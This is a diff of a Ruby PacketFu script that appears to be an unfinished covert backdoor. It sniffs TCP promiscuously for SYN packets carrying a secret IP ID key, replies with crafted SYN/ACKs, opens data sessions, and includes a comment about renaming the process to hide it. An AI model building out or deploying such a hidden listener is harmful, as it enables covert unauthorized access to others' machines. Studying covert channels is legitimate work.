@@ -10,7 +10,7 @@ include PacketFu
 def loadConfig(filePath)
 	#TODO: Load up file and get config
 	#For now just hard coded.
-	$iName = "lo"
+	$iName = "eth0"
 	identKey = 12345
 	listenPortMain = "80" # Port to listen for connection requests
 	processName = "xyz" # Change process name to hide.
@@ -137,32 +137,28 @@ sessions = []
 
 begin 
 	# Start listening for connection packets via TCP
-	capturedTCP = PacketFu::Capture.new(:iface => $config[:iface], :start => true, :promisc => true, :filter => "tcp and port 80")
-
+	print "starting up\n"
+	capturedTCP = PacketFu::Capture.new(:iface => $config[:iface], :start => true, :promisc => true, :filter => "tcp")
+	print "about to capture\n"
 	capturedTCP.stream.each { |packet|
+		puts "Got one!"
 		pkt = Packet.parse packet
 		# Check that it is a TCP packet?
 		if pkt.is_tcp?
 			# Is it one of our SYN packets?
-			if pkt.tcp_flags.syn == 1 && pkt.ip_id == identKey
+			if pkt.tcp_flags.syn == 1 && pkt.ip_id == $identKey
 				# TODO: Respond with SYN/ACK
 				flags = [1,0,0,0,1,0]
 				payload = ""
-				tcpResp = tcpConstruct(identKey,srcIP,80,dstIP,Random.rand(65535),flags, payload)
+				tcpResp = tcpConstruct($identKey,srcIP,80,dstIP,Random.rand(65535),flags, payload)
 				tcpResp.to_w # Sent
-				# Start new thread to handle this user's session
-				user_session = Thread.new{dataListener(identKey,dstIP,dstPort)}
-				sessions.push(user_session)
+				# TODO: Use thread instead.
+				dataListener($identKey,dstIP,dstPort)
 				
 			end
 		end
-		
 	}
-	rescue Interrupt
-		print "Program Terminated, closing connections\n"
-		sessions.each { |ses|
-			ses.join
-			Thread.kill(ses)
-		}
-		exit 0
+	rescue Interrupt => e
+	puts "Interrupted by user"
+	exit 0
 end
